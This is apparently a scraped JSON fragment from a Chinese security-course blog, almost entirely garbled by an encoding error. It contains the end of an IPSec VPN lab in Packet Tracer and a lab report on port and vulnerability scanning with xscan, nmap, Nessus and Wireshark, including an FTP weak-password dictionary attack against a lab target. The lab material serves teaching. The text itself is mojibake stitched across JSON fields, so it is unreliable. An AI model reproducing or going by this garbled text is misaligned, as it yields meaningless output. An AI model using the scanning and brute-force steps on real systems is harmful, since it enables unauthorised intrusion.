modeï¼Œå¼¹å‡ºå¦‚å›¾æ‰€ç¤ºå¯¹è¯æ¡†\né‡å¤ä¸Šä¸€æ­¥æ“ä½œï¼Œsimulation Panelä¸­é€‰å–Auto Captureï¼Œè§‚å¯Ÿå·¥ä½œåŒºåŠ¨ç”»ï¼Œå±•ç¤ºäº†æ•°æ®åŒ…åœ¨ç½‘ç»œä¸­çš„ä¼ é€è¿‡ç¨‹\nåŒå‡»è·¯ç”±å™¨router 0å¤„æ•°æ®åŒ…ï¼Œå¼¹å‡ºå¦‚å›¾æ‰€ç¤ºå¼¹æ¡†ï¼Œå¯ä»¥åˆ†æå‡ºæ•°æ®åŒ…çš„ä¿¡æ¯\nè¿›å…¥è·¯ç”±å™¨çš„æ•°æ®åŒ…ï¼ˆå·¦ä¾§ï¼‰çš„ä¿¡æ¯æºIPæ˜¯192.168.1.10ï¼Œç›®çš„IPæ˜¯192.168.2.10 è·¯ç”±å™¨å‡ºå»çš„æ•°æ®åŒ…(å³ä¾§)çš„æºIPæ”¹å˜ä¸º10.0.0.1ï¼Œç›®çš„IPå˜ä¸º10.0.0.2 ä»ä¸Šå›¾çš„ç¬¬å…­æ¡ä¿¡æ¯ä¸­å‘ç°ESP encrypts the received packetçš„ä¿¡æ¯ ç»¼ä¸Šï¼Œä»PC0ï¼ˆ192.168.1.10ï¼‰å‘å¾€å¯¹ç«¯PC3ï¼ˆ192.168.2.10ï¼‰çš„æ•°æ®ç»è¿‡äº†è·¯ç”±å™¨çš„IPSec VPNæ¨¡å—åŠ å¯†å¤„ç†ï¼Œéšè—äº†å†…ç½‘çš„IPåœ°å€ä¿¡æ¯ï¼Œä»è€Œä¿æŠ¤äº†å†…ç½‘çš„æ•°æ® æ–­å¼€VPN\næ–­å¼€router 0\n1 2 3 Routerï¼ˆconfigï¼‰#interface fastEthernet 0/0 Router(config-if)#no crypto map mymap Routerï¼ˆconfig-ifï¼‰end åŒå‡»PC0å›¾æ ‡ï¼Œåœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­ï¼Œé€‰æ‹©Desktopï¼Œé€‰æ‹©Command Promptï¼Œping 192.168.2.10ï¼Œpingä¸é€šï¼Œè¡¨æ˜åªæ–­å¼€ä¸€ç«¯è·¯ç”±å™¨çš„ç«¯å£mapæ˜ å°„ï¼Œä¸¤è¾¹æ— æ³•è¿é€š\nä»¥åŒæ ·çš„æ–¹å¼æ–­å¼€route 1\n1 2 3 Routerï¼ˆconfigï¼‰#interface fastEthernet 0/0 Router(config-if)#no crypto map mymap Routerï¼ˆconfig-ifï¼‰end åŒå‡»PC0å›¾æ ‡ï¼Œåœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­ï¼Œé€‰æ‹©Desktopï¼Œé€‰æ‹©Command Promptï¼Œping 192.168.2.10ï¼ŒpingæˆåŠŸï¼Œè¡¨æ˜ä¸¤ç«¯éƒ½æ–­å¼€åï¼Œä¸¤è¾¹ç½‘ç»œå¯ä»¥å†æ¬¡ä¿æŒè¿æ¥\næŠ“å–ç»è¿‡route 0çš„æ•°æ®åŒ…ï¼Œå‘ç°æ•°æ®ä¸å†åŠ å¯†ä¼ è¾“ã€‚\n0x06 æ€»ç»“ é€šè¿‡é…ç½®IPSECï¼Œæ˜ç™½AHå’ŒESPçš„åŒºåˆ«ã€‚ é…ç½®OPEN VPN,PacketTrace å¯¹å±€åŸŸç½‘çš„æ¶æ„æœ‰äº†ä¸€å®šçš„äº†è§£ã€‚ é…ç½®å¤šä¸ªVPNï¼Œæ˜ç™½äº†VPNçš„å·¥ä½œåŸç†ã€‚ ","permalink":"http://www.reus09.top/posts/tech/vpn%E9%85%8D%E7%BD%AE/","summary":"VPNé…ç½®å®éªŒ 0x01 å®éªŒå†…å®¹ åœ¨Windows IPSECé…ç½®å®éªŒä¸­ï¼Œé€šè¿‡æŠ“åŒ…å·¥å…·æŠ“å–IKE SAå’ŒIPSEC SAå»ºç«‹è¿‡ç¨‹çš„æ•°æ®åŒ…ï¼Œå¹¶è¿›è¡Œåˆ†æï¼›æ€è€ƒï¼š","title":"Vpné…ç½®"},{"content":"ç½‘ç»œæ‰«æ 0x01 å®éªŒç›®çš„ ç”¨xscanã€nmapå’Œnessusè½¯ä»¶è¿›è¡Œä¸»æœºã€ç«¯å£ã€æ¼æ´æ‰«æå®éªŒï¼Œæ•è·æ‰«ææ—¶äº¤äº’çš„æ•°æ®åŒ…ï¼Œé€šè¿‡åˆ†ææ‰«ææ•°æ®åŒ…ï¼ŒéªŒè¯æ‰«æåŸç†ã€‚ æ‰¾åˆ°ä¸€ç§å¸¸è§çš„ä¸»æœºç³»ç»Ÿæˆ–åº”ç”¨ç¨‹åºæ¼æ´ï¼Œç ”ç©¶è¯¥æ¼æ´çš„æ‰«æåŸç†ï¼Œå¯¹è¯¥æ¼æ´è¿›è¡Œæ‰«æå™¨æ‰«æå®éªŒï¼Œé€šè¿‡åˆ†ææ•è·çš„æ‰«ææ•°æ®åŒ…éªŒè¯æ¼æ´æ‰«æåŸç†ã€‚(é€‰åš) ç¼–ç¨‹å®ç°TCPå…¨è¿æ¥æˆ–åŠè¿æ¥çš„ç«¯å£æ‰«æã€‚ï¼ˆé€‰åšï¼‰ 0x02 å®éªŒå‰æçŸ¥è¯† ç½‘ç»œæ‰«æå™¨çš„ä¸»è¦åŠŸèƒ½\næ‰«æç›®æ ‡ä¸»æœºè¯†åˆ«å…¶å·¥ä½œçŠ¶æ€ï¼ˆå¼€/å…³æœºï¼‰ è¯†åˆ«ç›®æ ‡ä¸»æœºç«¯å£çš„çŠ¶æ€ï¼ˆç›‘å¬/å…³é—­ï¼‰ è¯†åˆ«ç›®æ ‡ä¸»æœºç³»ç»ŸåŠæœåŠ¡ç¨‹åºçš„ç±»å‹å’Œç‰ˆæœ¬ æ ¹æ®å·²çŸ¥æ¼æ´ä¿¡æ¯ï¼Œåˆ†æç³»ç»Ÿè„†å¼±ç‚¹ ç”Ÿæˆæ‰«æç»“æœæŠ¥å‘Š æ‰«æå™¨çš„åŸºæœ¬å·¥ä½œåŸç†\nç½‘ç»œæ‰«ææŠ€æœ¯\nä¸»æœºæ‰«ææŠ€æœ¯\nä¸»æœºæ‰«æçš„ç›®çš„æ˜¯ç¡®å®šåœ¨ç›®æ ‡ç½‘ç»œä¸Šçš„ä¸»æœºæ˜¯å¦å¯è¾¾ã€‚è¿™æ˜¯ä¿¡æ¯æ”¶é›†çš„åˆçº§é˜¶æ®µï¼Œå…¶æ•ˆæœç›´æ¥å½±å“åˆ°åç»­çš„æ‰«æã€‚ ä¼ ç»Ÿæ‰«ææ‰‹æ®µ ICMP Echoæ‰«æ ICMP Sweepæ‰«æ Broadcast ICMPæ‰«æ Non-Echo ICMPæ‰«æ é˜²ç«å¢™å’Œç½‘ç»œè¿‡æ»¤è®¾å¤‡å¸¸å¸¸å¯¼è‡´ä¼ ç»Ÿçš„æ¢æµ‹æ‰‹æ®µå˜å¾—æ— æ•ˆã€‚ä¸ºäº†çªç ´è¿™ç§é™åˆ¶ï¼Œå¿…é¡»é‡‡ç”¨ä¸€äº›éå¸¸è§„çš„æ‰‹æ®µï¼Œåˆ©ç”¨ICMPåè®®æä¾›ç½‘ç»œé—´ä¼ é€é”™è¯¯ä¿¡æ¯çš„æ‰‹æ®µï¼Œå¾€å¾€å¯ä»¥æ›´æœ‰æ•ˆçš„è¾¾åˆ°ç›®çš„ï¼š å¼‚å¸¸çš„IPåŒ…å¤´ åœ¨IPå¤´ä¸­è®¾ç½®æ— æ•ˆçš„å­—æ®µå€¼ é”™è¯¯çš„æ•°æ®åˆ†ç‰‡ é€šè¿‡è¶…é•¿åŒ…æ¢æµ‹å†…éƒ¨è·¯ç”±å™¨ åå‘æ˜ å°„æ¢æµ‹ ç«¯å£æ‰«ææŠ€æœ¯\nç¡®å®šç›®æ ‡ä¸»æœºå¯è¾¾åï¼Œä½¿ç”¨ç«¯å£æ‰«ææŠ€æœ¯ï¼Œå‘ç°ç›®æ ‡ä¸»æœºçš„å¼€æ”¾ç«¯å£ï¼ŒåŒ…æ‹¬ç½‘ç»œåè®®å’Œå„ç§åº”ç”¨ç›‘å¬çš„ç«¯å£ã€‚\nå¼€æ”¾æ‰«æ ä¼šäº§ç”Ÿå¤§é‡çš„å®¡è®¡æ•°æ®ï¼Œå®¹æ˜“è¢«å¯¹æ–¹å‘ç°ï¼Œä½†å…¶å¯é æ€§é«˜\nTCP Connect æ‰«æ TCPåå‘identæ‰«æ éšè”½æ‰«æ\nèƒ½æœ‰æ•ˆçš„é¿å…å¯¹æ–¹å…¥ä¾µæ£€æµ‹ç³»ç»Ÿå’Œé˜²ç«å¢™çš„æ£€æµ‹ï¼Œä½†è¿™ç§æ‰«æä½¿ç”¨çš„æ•°æ®åŒ…åœ¨é€šè¿‡ç½‘ç»œæ—¶å®¹æ˜“è¢«ä¸¢å¼ƒä»è€Œäº§ç”Ÿé”™è¯¯çš„æ¢æµ‹ä¿¡æ¯\nTCP FIN æ‰«æ TCP Xmasæ‰«æ TCP Null æ‰«æ TCP ftp proxyæ‰«æ åˆ†æ®µæ‰«æ åŠå¼€æ”¾æ‰«æ\néšè”½æ€§å’Œå¯é æ€§ä»‹äºå‰ä¸¤è€…ä¹‹é—´ã€‚\nTCP SYN æ‰«æ TCPé—´æ¥æ‰«æ UDPç«¯å£æ‰«æ\næ ˆæŒ‡çº¹OSè¯†åˆ«æŠ€æœ¯\næ ¹æ®å„ä¸ªOSåœ¨TCP/IPåè®®æ ˆå®ç°ä¸Šçš„ä¸åŒç‰¹ç‚¹ï¼Œé‡‡ç”¨é»‘ç›’æµ‹è¯•æ–¹æ³•ï¼Œé€šè¿‡ç ”ç©¶å…¶å¯¹å„ç§æ¢æµ‹çš„å“åº”å½¢æˆè¯†åˆ«æŒ‡çº¹ï¼Œè¿›è€Œè¯†åˆ«ç›®æ ‡ä¸»æœºè¿è¡Œçš„æ“ä½œç³»ç»Ÿ è¢«åŠ¨æ‰«æ é€šè¿‡Snifferæ”¶é›†æ•°æ®åŒ…ï¼Œå†å¯¹æ•°æ®åŒ…çš„ä¸åŒç‰¹å¾ï¼ˆTCP Window\u0002sizeã€ IP TTLã€IP TOSã€DFä½ç­‰å‚æ•°ï¼‰è¿›è¡Œåˆ†æï¼Œæ¥è¯†åˆ«æ“ä½œç³»ç»Ÿã€‚ ä¸»åŠ¨æ‰«æ é‡‡ç”¨å‘ç›®æ ‡ç³»ç»Ÿå‘é€æ„é€ çš„ç‰¹æ®ŠåŒ…å¹¶ç›‘æ§å…¶åº”ç­”çš„æ–¹å¼æ¥è¯†åˆ«æ“ä½œç³»ç»Ÿç±»å‹ã€‚ æ¼æ´æ‰«ææŠ€æœ¯\nåœ¨ç«¯å£æ‰«æåå¾—çŸ¥ç›®æ ‡ä¸»æœºå¼€å¯çš„ç«¯å£ä»¥åŠç«¯å£ä¸Šçš„ç½‘ç»œæœåŠ¡ï¼Œå°†è¿™äº›ç›¸å…³ä¿¡æ¯ä¸ç½‘ç»œæ¼æ´æ‰«æç³»ç»Ÿæä¾›çš„æ¼æ´åº“è¿›è¡ŒåŒ¹é…ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰æ»¡è¶³åŒ¹é…æ¡ä»¶çš„æ¼æ´å­˜åœ¨ã€‚ é€šè¿‡æ¨¡æ‹Ÿé»‘å®¢çš„æ”»å‡»æ‰‹æ³•ï¼Œå¯¹ç›®æ ‡ä¸»æœºç³»ç»Ÿè¿›è¡Œæ”»å‡»æ€§çš„å®‰å…¨æ¼æ´æ‰«æï¼Œå¦‚æµ‹è¯•å¼±åŠ¿å£ä»¤ç­‰ã€‚è‹¥æ¨¡æ‹Ÿæ”»å‡»æˆåŠŸï¼Œåˆ™è¡¨æ˜ç›®æ ‡ä¸»æœºç³»ç»Ÿå­˜åœ¨å®‰å…¨æ¼æ´ã€‚ CGIæ¼æ´æ‰«æã€POP3æ¼æ´æ‰«æã€FTPæ¼æ´æ‰«æã€SSHæ¼æ´æ‰«æã€HTTPæ¼æ´æ‰«æç­‰ã€‚è¿™äº›æ¼æ´æ‰«ææ˜¯åŸºäºæ¼æ´åº“ï¼Œå°†æ‰«æç»“æœä¸æ¼æ´åº“ç›¸å…³æ•°æ®åŒ¹é…æ¯”è¾ƒå¾—åˆ°æ¼æ´ä¿¡æ¯ã€‚ Unicodeéå†ç›®å½•æ¼æ´æ¢æµ‹ã€FTP å¼±å¯†ç æ¢æµ‹ã€OPENRelayé‚®ä»¶è½¬å‘æ¼æ´æ¢æµ‹ç­‰ï¼Œè¿™äº›æ‰«æé€šè¿‡ä½¿ç”¨æ’ä»¶ï¼ˆåŠŸèƒ½æ¨¡å—æŠ€æœ¯ï¼‰è¿›è¡Œæ¨¡æ‹Ÿæ”»å‡»ï¼Œæµ‹è¯•å‡ºç›®æ ‡ä¸»æœºçš„æ¼æ´ä¿¡æ¯ã€‚ 0x03 å®éªŒç¯å¢ƒ Winodows xp æ±‡ç¼– IP:192.168.195.135 MAC: 00-0c-29-19-ba-6e Winodows xp ç½‘ç»œå®‰å…¨å®éªŒ IP:192.168.195.131 MAC:00-0c-29-06-65-c9 Windows 7 IP:192.168.195.145 MAC:00-0c-29-f1-b5-17 ç¨‹åºè¿è¡Œæœºå™¨ Ubuntu 16 ç½‘å…³ IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 å·¥å…· xscan nmap nessus wireshark 0x04 è½¯ä»¶æ‰«æ xscan xscan é…ç½® å‚æ•°\nå¼€å§‹æ‰«æ\næ‰«æç»“æœ WiresharkæŠ“åŒ…åˆ†æ\né¦–å…ˆåº”è¯¥æ˜¯ SYNåŠæ‰«æç«¯å£æ˜¯å¦å¼€æ”¾\næºIP(192.168.195.131)éšæœºç«¯å£å‘é€tcp-synè¿æ¥ç»™ç›®çš„IP(1921.68.195.135)\nå› ä¸ºæ‰«æäº†1024ä¸ªç«¯å£ï¼Œè¿™é‡Œåªæ”¾ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªç«¯å£çš„æˆªå›¾\nSYNæ‰«æå®ç°åŸç†ï¼šæ‰«æå™¨å‘ç›®æ ‡ä¸»æœºç«¯å£å‘é€SYNåŒ…ã€‚å¦‚æœåº”ç­”æ˜¯RSTåŒ…ï¼Œé‚£ä¹ˆè¯´æ˜ç«¯å£æ˜¯å…³é—­çš„ï¼›å¦‚æœåº”ç­”ä¸­åŒ…å«SYNå’ŒACKåŒ…ï¼Œè¯´æ˜ç›®æ ‡ç«¯å£å¤„äºç›‘å¬çŠ¶æ€ï¼Œå†ä¼ é€ä¸€ä¸ªRSTåŒ…ç»™ç›®æ ‡æœºä»è€Œåœæ­¢å»ºç«‹è¿æ¥ã€‚\nå¯ä»¥çœ‹åˆ°å¤§é‡çš„tcp-synè¯·æ±‚ï¼Œè¿”å›çš„å‡ä¸ºRST,æ ‡æ˜è¯¥ç«¯å£æ²¡æœ‰å¼€æ”¾\nå¦‚æœè¿”å›ä¸ºSYN+ACK,åˆ™è¡¨æ˜ç«¯å£å¼€æ”¾\nTCP Connect æ‰«æ\nå®ç°åŸç†ï¼šé€šè¿‡è°ƒç”¨socketå‡½æ•°connect()è¿æ¥åˆ°ç›®æ ‡è®¡ç®—æœºä¸Šï¼Œå®Œæˆä¸€æ¬¡å®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ã€‚å¦‚æœç«¯å£å¤„äºä¾¦å¬çŠ¶æ€ï¼Œé‚£ä¹ˆconnect()å°±èƒ½æˆåŠŸè¿”å›ã€‚å¦åˆ™ï¼Œè¿™ä¸ªç«¯å£ä¸å¯ç”¨ï¼Œå³æ²¡æœ‰æä¾›æœåŠ¡ã€‚ é€šè¿‡ä¸‰æ¬¡æ¡æ‰‹ï¼ŒæŸ¥çœ‹ç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œå¹¶è¿›è¡Œä¸€å®šçš„ä½¿ç”¨ ftps ssh http https sslv2åè®®è¯•æ¢\nUDPç«¯å£æ‰«æ\nå‘ç›®æ ‡ç«¯å£å‘é€UDP åŒ…ã€‚å¦‚æœå¾—åˆ°çš„åº”ç­”ä¸ºâ€œICMP port Unreachableâ€ï¼ˆICMP ç«¯å£ä¸å¯åˆ°è¾¾ï¼‰ï¼Œé‚£ä¹ˆç›®æ ‡ç«¯å£æ˜¯å…³é—­çš„ã€‚ åä¹‹ï¼Œå¦‚æœæ²¡æœ‰æ”¶åˆ°è¿™ä¸ªåº”ç­”æ¶ˆæ¯ï¼Œåˆ™ç›®æ ‡ç«¯å£ææœ‰å¯èƒ½æ˜¯å¼€æ”¾çš„ã€‚ ç»“åˆæŠ¥å‘Šï¼Œxscanä¸»è¦å¯¹netbios-ssn(139/tcp)ã€https (443/tcp)ã€FTP-ssl (990/tcp)ã€ssh (22/tcp)ã€www (443/tcp)ã€ftp (990/tcp)ã€microsoft-ds (445/tcp)ã€ftp (21/tcp)ã€epmap (135/tcp)ã€www (80/tcp)ã€netbios-ns (137/udp)ã€ntp (123/udp)\nnmap å‚æ•°è®¾ç½®\né¦–å…ˆå¼€å¯çš„ä¸º TCP SYNæ‰«æ\nTCP - SYNæ‰«æ\næ‰«æå™¨å‘ç›®æ ‡ä¸»æœºç«¯å£å‘é€FINåŒ…ã€‚å½“ä¸€ä¸ªFINæ•°æ®åŒ…åˆ°è¾¾ä¸€ä¸ªå…³é—­çš„ç«¯å£ï¼Œæ•°æ®åŒ…ä¼šè¢«ä¸¢æ‰ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªRSTæ•°æ®åŒ…ã€‚å¦åˆ™ï¼Œè‹¥æ˜¯æ‰“å¼€çš„ç«¯å£ï¼Œæ•°æ®åŒ…åªæ˜¯ç®€å•çš„ä¸¢æ‰ï¼ˆä¸è¿”å›RSTï¼‰ã€‚ WiresharkæŠ“åŒ…\nã€ å‘ç°æ— æ•ˆï¼Œå› ä¸ºTCP SYNæ‰«æé€šå¸¸é€‚ç”¨äºUNIXç›®æ ‡ä¸»æœºï¼Œä½†åœ¨Windows95/NTç¯å¢ƒä¸‹ï¼Œè¯¥æ–¹æ³•æ— æ•ˆã€‚å› ä¸ºä¸è®ºç›®æ ‡ç«¯å£æ˜¯å¦æ‰“å¼€ï¼Œæ“ä½œç³»ç»Ÿéƒ½è¿”å›RSTåŒ…ã€‚æˆ‘ä»¬è¿™é‡Œçš„ç›®æ ‡ä¸»æœºæ˜¯xpç³»ç»Ÿï¼Œæ‰€ä»¥æ— è®ºä»€ä¹ˆç«¯å£éƒ½ä¼šå›æ˜¾RSTåŒ… å¼€å¯ TCP ACK æ‰«æ\nTCP-ACKæ‰«æ TCP ACKæ‰«ææ˜¯åˆ©ç”¨æ ‡å¿—ä½ACKï¼Œè€ŒACKæ ‡å¿—åœ¨TCPåè®®ä¸­è¡¨ç¤ºç¡®è®¤åºå·æœ‰æ•ˆï¼Œå®ƒè¡¨ç¤ºç¡®è®¤ä¸€ä¸ªæ­£å¸¸çš„TCPè¿æ¥ã€‚ä½†æ˜¯åœ¨TCP ACKæ‰«æä¸­æ²¡æœ‰è¿›è¡Œæ­£å¸¸çš„TCPè¿æ¥è¿‡ç¨‹ï¼Œå®é™…ä¸Šæ˜¯æ²¡æœ‰çœŸæ­£çš„TCPè¿æ¥ã€‚é‚£ä¹ˆå½“å‘é€ä¸€ä¸ªå¸¦æœ‰ACKæ ‡å¿—çš„TCPæŠ¥æ–‡åˆ°ç›®æ ‡ä¸»æœºçš„ç«¯å£æ—¶ï¼Œç›®æ ‡ä¸»æœºä¼šæ€æ ·ååº”å‘¢ï¼Ÿ ä½¿ç”¨TCP ACKæ‰«æä¸èƒ½å¤Ÿç¡®å®šç«¯å£çš„å…³é—­æˆ–è€…å¼€æ”¾ï¼Œå› ä¸ºå½“å‘é€ç»™å¯¹æ–¹ä¸€ä¸ªå«æœ‰ACKè¡¨ç¤ºçš„TCPæŠ¥æ–‡çš„æ—¶å€™ï¼Œéƒ½è¿”å›å«æœ‰RSTæ ‡å¿—çš„æŠ¥æ–‡ï¼Œæ— è®ºç«¯å£æ˜¯å¼€æ”¾æˆ–è€…å…³é—­ã€‚æ‰€ä»¥ï¼Œä¸èƒ½ä½¿ç”¨TCP ACKæ‰«ææ¥ç¡®å®šç«¯å£æ˜¯å¦å¼€æ”¾æˆ–è€…å…³é—­ã€‚ä½†æ˜¯å¯ä»¥åˆ©ç”¨å®ƒæ¥æ‰«æé˜²ç«å¢™çš„é…ç½®ï¼Œç”¨å®ƒæ¥å‘ç°é˜²ç«å¢™è§„åˆ™ï¼Œç¡®å®šå®ƒä»¬æ˜¯æœ‰çŠ¶æ€çš„è¿˜æ˜¯æ— çŠ¶æ€çš„ï¼Œå“ªäº›ç«¯å£æ˜¯è¢«è¿‡æ»¤çš„ WiresharkæŠ“åŒ… å¯ä»¥çœ‹åˆ°æºä¸»æœºå‘é€çš„TCPè¯·æ±‚åŒ…ä¸­ï¼ŒACKç›´æ¥è¢«åˆå§‹åŒ–äº†ï¼Œæ²¡æœ‰äº†SYNè¿‡ç¨‹ å¼€å¯TCP - Xmas æ‰«æ\nTCP - Xmas æ‰«æ TCP Xmaså’ŒNullæ‰«ææ˜¯FINæ‰«æçš„ä¸¤ä¸ªå˜ç§ã€‚Xmasæ‰«ææ‰“å¼€FINï¼ŒURGå’ŒPUSHæ ‡è®°ï¼Œè€ŒNullæ‰«æå…³é—­æ‰€æœ‰æ ‡è®°ã€‚ è¿™äº›ç»„åˆçš„ç›®çš„æ˜¯ä¸ºäº†é€šè¿‡å¯¹FINæ ‡è®°æ•°æ®åŒ…çš„è¿‡æ»¤ã€‚ å½“æ­¤ç±»æ•°æ®åŒ…åˆ°è¾¾ä¸€ä¸ªå…³é—­çš„ç«¯å£ï¼Œæ•°æ®åŒ…ä¼šè¢«ä¸¢æ‰ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªRSTæ•°æ®åŒ…ã€‚å¦åˆ™ï¼Œè‹¥æ˜¯æ‰“å¼€çš„ç«¯å£ï¼Œæ•°æ®åŒ…åªæ˜¯ç®€å•çš„ä¸¢æ‰ï¼ˆä¸è¿”å›RSTï¼‰ã€‚ Wireshak æŠ“åŒ… å¯ä»¥çœ‹åˆ°å‘çš„æºIPåŒ…é‡Œé¢å¸¦æœ‰Urgentã€Finã€Pushå­—æ®µ TCP - Connect æ‰«æ\né€šè¿‡è°ƒç”¨socketå‡½æ•°connect()è¿æ¥åˆ°ç›®æ ‡è®¡ç®—æœºä¸Šï¼Œå®Œæˆä¸€æ¬¡å®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ã€‚å¦‚æœç«¯å£å¤„äºä¾¦å¬çŠ¶æ€ï¼Œé‚£ä¹ˆconnect()å°±èƒ½æˆåŠŸè¿”å›ã€‚å¦åˆ™ï¼Œè¿™ä¸ªç«¯å£ä¸å¯ç”¨ï¼Œå³æ²¡æœ‰æä¾›æœåŠ¡\nWireshark æŠ“åŒ…\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¼€æ”¾çš„httpç«¯å£ç»è¿‡TCPä¸‰æ¬¡è¿æ¥å¯ä»¥è¿æ¥ï¼Œè€Œå¦ä¸€ä¸ªç«¯å£æ— æ³•è¿æ¥ï¼Œè¿”å›ä¸€ä¸ªRSTåŒ…\nå¼€å¯ TCP NULL æ‰«æ\nTCP NULL æ‰«æ TCP Xmaså’ŒNullæ‰«ææ˜¯FINæ‰«æçš„ä¸¤ä¸ªå˜ç§ã€‚è€ŒNullæ‰«æå…³é—­æ‰€æœ‰æ ‡è®°ã€‚è¿™äº›ç»„åˆçš„ç›®çš„æ˜¯ä¸ºäº†é€šè¿‡å¯¹FINæ ‡è®°æ•°æ®åŒ…çš„è¿‡æ»¤ã€‚å½“æ­¤ç±»æ•°æ®åŒ…åˆ°è¾¾ä¸€ä¸ªå…³é—­çš„ç«¯å£ï¼Œæ•°æ®åŒ…ä¼šè¢«ä¸¢æ‰ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªRSTæ•°æ®åŒ…ã€‚å¦åˆ™ï¼Œè‹¥æ˜¯æ‰“å¼€çš„ç«¯å£ï¼Œæ•°æ®åŒ…åªæ˜¯ç®€å•çš„ä¸¢æ‰ï¼ˆä¸è¿”å›RSTï¼‰ã€‚ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¼€æ”¾çš„ç«¯å£éƒ½æ²¡æœ‰å›æ˜¾ï¼Œå…³é—­çš„ç«¯å£éƒ½è¿”å›ä¸€ä¸ªRSTã€ACKåŒ… å¼€å¯ TCP æ»‘åŠ¨çª—å£æ‰«æ\nå…¶å®å°±æ˜¯å¤§é‡çš„TCP ACKæ‰«æ\næ ¹æ®æŠ“åŒ…ï¼Œå‘ç°å…¶å³ä¸ºé€šè¿‡åŒæ—¶å‘é€å¤§é‡çš„ACKåŒ…ï¼Œè¿™é‡Œæ˜¯TCP ACKæ‰«æ\nåŒæ—¶å¤§é‡è¿”å›å¯¹ä¸Šè¿°åŒ…çš„RSTåŒ…æ¥æŸ¥çœ‹ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚\nTCP FIN æ‰«æ\nTCP FIN æ‰«æ æ‰«æå™¨å‘ç›®æ ‡ä¸»æœºç«¯å£å‘é€FINåŒ…ã€‚å½“ä¸€ä¸ªFINæ•°æ®åŒ…åˆ°è¾¾ä¸€ä¸ªå…³é—­çš„ç«¯å£ï¼Œæ•°æ®åŒ…ä¼šè¢«ä¸¢æ‰ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªRSTæ•°æ®åŒ…ã€‚å¦åˆ™ï¼Œè‹¥æ˜¯æ‰“å¼€çš„ç«¯å£ï¼Œæ•°æ®åŒ…åªæ˜¯ç®€å•çš„ä¸¢æ‰ï¼ˆä¸è¿”å›RSTï¼‰ã€‚ Wiresharkåˆ†æ é€šè¿‡å°†è¯·æ±‚åŒ…ç½®ä¸ºFINæŸ¥çœ‹ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚ nmapæŠ¥å‘Š\nnessus å› ä¸ºWindow xpé‡Œé¢çš„ nessusç‰ˆæœ¬ç”¨ä¸äº†\næ‰€ä»¥åœ¨è™šæ‹ŸæœºWindows 7 é‡Œé¢æ­å»ºæ–°ç‰ˆçš„ Nessus 8\nå¹¶ä¸”å¯¹é¶æœº192.168.195.135è¿›è¡Œæ”»å‡»\nåˆ©ç”¨Wiresharkè¿›è¡ŒæŠ“åŒ…åˆ†ææ•°æ®æµã€‚\nTCP-SYNæ‰«æ\nè¿™é‡Œä»…ä»¥HTTPä¸ºä¾‹å­ã€‚(å…¶ä»–çš„åè®®å°±ä¸èµ˜è¿°äº†)\n80ç«¯å£å¼€æ”¾ï¼Œæ‰€ä»¥SYNè¯·æ±‚ä¹‹åï¼Œå¯ä»¥æ­£å¸¸å›æ˜¾ï¼Œåä¹‹ï¼Œå¦‚æœè¯·æ±‚çš„ç«¯å£81.82æ²¡æœ‰å¼€æ”¾ï¼Œåˆ™å›æ˜¾ä¸€ä¸ªRSTåŒ…\nTCP - Connect æ‰«æ\nå¯ä»¥çœ‹åˆ° äº¤äº’è¿‡ç¨‹å…ˆ å®ç°ä¸‰æ¬¡æ¡æ‰‹ã€‚æŸ¥çœ‹äº†HTTPSã€HTTPã€TLSV1ã€sshã€FTPåè®® SSLV2 åè®®æ˜¯å¦æ”¯æŒ\nSSLv3 åè®®æ˜¯å¦æ”¯æŒ\nnessus æ‰«æ192.168.195.135 å¾—åˆ°çš„æ¼æ´æŠ¥å‘Š\n0x05 æ‰¾åˆ°æ¼æ´ FTPå¼±å£ä»¤æ¼æ´æ‰«æï¼š æ‰«æåŸç†ï¼š åœ¨ä¸Šè¿°å®éªŒè¿‡ç¨‹ä¸­ï¼Œå‘ç°é¶æœºå¼€å¯äº†21(é»˜è®¤ç«¯å£)ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨å­—å…¸é‡Œçš„è´¦æˆ·å’Œå¯†ç å»è¯•ç€ç™»å½•ï¼Œå¦‚æœèƒ½å¤Ÿç™»é™†ä¸Šå»ï¼Œåˆ™å­˜åœ¨æ¼æ´ åˆ©ç”¨S-scanè¿›è¡Œæ‰«ææ¨¡å— é€‰æ‹©æ‰«ææ¨¡å—ï¼Œæ‰«æç«¯å£ æ‰«æç»“æŸ ç”Ÿæˆçš„æŠ¥å‘Š ç”¨Wireshark å¯¹è¿‡ç¨‹è¿›è¡Œåˆ†æ é¦–å…ˆï¼Œæ”»å‡»æœºåˆ©ç”¨éšæœºç«¯å£å‘é¶æœºçš„FTPç«¯å£å‘å‡ºTCP SYNè¿æ¥è¯·æ±‚ ç„¶åï¼Œé¶æœºç«¯ç»™å…¶å›å¤ä¸€ä¸ªACK,æ­¤æ—¶å¯ä»¥ç›‘å¬åˆ°21ç«¯å£ æœ€åï¼Œæ”»å‡»æœºæ”¶åˆ°é¶æœºçš„ackï¼Œå†å›å¤ä¸€ä¸ªack,è‡³æ­¤ä¸‰æ¬¡æ¡æ‰‹å®Œæˆ ä¹‹åï¼Œæ”»å‡»æœºå°±å¼€å§‹ç”¨å­—å…¸é‡Œé¢çš„æ•°æ®æ¥ ä¸æ–­å‘é€æ•°æ®åŒ…æ¥æš´åŠ›ç ´è§£ é¶æœºçš„FTPæœåŠ¡å™¨å¯†ç è´¦æˆ· ä¹‹åçš„è¿‡ç¨‹ï¼Œæ”»å‡»æœºä¸€ç›´å†é‡å¤ä»¥ä¸Šè¿‡ç¨‹ï¼Œä½†å¯èƒ½å› ä¸ºFTPè´¦æˆ·å’Œå¯†ç 